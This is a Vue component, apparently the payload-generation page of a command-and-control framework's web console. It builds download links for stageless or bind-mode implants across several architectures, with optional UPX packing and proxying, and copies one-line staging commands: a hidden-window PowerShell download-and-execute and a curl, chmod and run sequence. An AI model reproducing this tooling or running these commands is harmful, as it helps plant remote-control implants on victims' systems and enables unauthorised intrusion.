<script setup lang="ts">
// 载荷下载：按监听器生成 stageless，或独立 listen 载荷；支持复制拉取命令
import { onMounted, reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { downloadURL, post } from '../api/http'

const listeners = ref<any[]>([])
const form = reactive({
  id: 0, arch: 'linux_amd64', tp: 'tcp', host: '127.0.0.1', port: 4444,
  vkey: '', salt: '', upx: false,
  useProxy: false, proxy: '',
})
const arches = ['linux_amd64', 'linux_386', 'linux_arm64', 'linux_arm',
  'windows_amd64', 'windows_386', 'darwin_amd64', 'darwin_arm64']

async function load() {
  const res: any = await post('/listener/list', { page: 1, pageSize: 100 })
  listeners.value = res?.result?.items || []
  if (!form.id && listeners.value.length) form.id = listeners.value[0].Id
}
onMounted(load)

function url(kind: 'stageless' | 'listen') {
  if (kind === 'stageless') {
    if (!form.id) { message.warning('先选择监听器'); return '' }
    return downloadURL('/download/stageless', {
      id: form.id, arch: form.arch, upx: String(form.upx),
      proxy: form.useProxy ? form.proxy : '',
    })
  }
  return downloadURL('/download/listen', {
    arch: form.arch, tp: form.tp, host: form.host, port: form.port,
    vkey: form.vkey, salt: form.salt, upx: String(form.upx),
  })
}

function download(kind: 'stageless' | 'listen') {
  const u = url(kind)
  if (u) location.href = u
}

function cmd(kind: 'stageless' | 'listen', platform: 'auto' | 'windows' | 'linux' = 'auto') {
  const u = url(kind)
  if (!u) return ''
  const win = platform === 'windows' || (platform === 'auto' && form.arch.startsWith('windows'))
  if (win) {
    // Windows：PowerShell 一行下载并运行
    return `powershell -nop -w hidden -c "iwr '${u}' -OutFile a.exe; .\\a.exe"`
  }
  return `curl -sSL '${u}' -o agent.bin && chmod +x agent.bin && ./agent.bin`
}

async function copy(kind: 'stageless' | 'listen', platform: 'auto' | 'windows' | 'linux' = 'auto') {
  const c = cmd(kind, platform)
  if (!c) return
  try { await navigator.clipboard.writeText(c); message.success('命令已复制') }
  catch { message.info(c) }
}
</script>

<template>
  <a-card :bordered="false" title="客户端生成">
    <a-form layout="inline" :label-col="{ span: 6 }">
      <a-form-item label="监听器">
        <a-select v-model:value="form.id" style="width: 220px">
          <a-select-option v-for="l in listeners" :key="l.Id" :value="l.Id">
            #{{ l.Id }} {{ l.Mode }} {{ l.ListenAddr }}
          </a-select-option>
        </a-select>
      </a-form-item>
      <a-form-item label="架构">
        <a-select v-model:value="form.arch" style="width: 180px">
          <a-select-option v-for="a in arches" :key="a" :value="a">{{ a }}</a-select-option>
        </a-select>
      </a-form-item>
      <a-form-item label="是否UPX压缩"><a-switch v-model:checked="form.upx" /></a-form-item>
      <a-form-item label="使用代理"><a-switch v-model:checked="form.useProxy" /></a-form-item>
      <a-form-item v-if="form.useProxy" label="连接代理">
        <a-input v-model:value="form.proxy" placeholder="http://user:pass@host:port" style="width: 240px" />
      </a-form-item>
    </a-form>

    <a-divider />
    <a-space wrap>
      <a-button type="primary" @click="download('stageless')">下载</a-button>
      <a-button @click="copy('stageless')">一键上线命令查看</a-button>
      <a-button @click="copy('stageless', 'windows')">Windows 上线命令</a-button>
      <a-button @click="copy('stageless', 'linux')">Linux 上线命令</a-button>
    </a-space>

    <a-divider>正向客户端（独立 listen 载荷）</a-divider>
    <a-form layout="inline">
      <a-form-item label="连接方式">
        <a-select v-model:value="form.tp" style="width: 120px">
          <a-select-option v-for="t in ['tcp', 'kcp', 'ws', 'http']" :key="t" :value="t">{{ t }}</a-select-option>
        </a-select>
      </a-form-item>
      <a-form-item label="回连地址"><a-input v-model:value="form.host" style="width: 160px" /></a-form-item>
      <a-form-item label="端口"><a-input-number v-model:value="form.port" :min="1" :max="65535" /></a-form-item>
      <a-form-item label="加密key明文内容">
        <a-input v-model:value="form.vkey" style="width: 160px" placeholder="Vkey" />
      </a-form-item>
      <a-form-item label="加密key加密模式">
        <a-input v-model:value="form.salt" style="width: 160px" placeholder="流量加密盐（可空）" />
      </a-form-item>
    </a-form>
    <a-space wrap style="margin-top: 12px">
      <a-button @click="download('listen')">下载</a-button>
      <a-button @click="copy('listen')">上线命令查看</a-button>
      <a-button @click="copy('listen', 'windows')">Windows 上线命令</a-button>
      <a-button @click="copy('listen', 'linux')">Linux 上线命令</a-button>
    </a-space>
  </a-card>
</template>
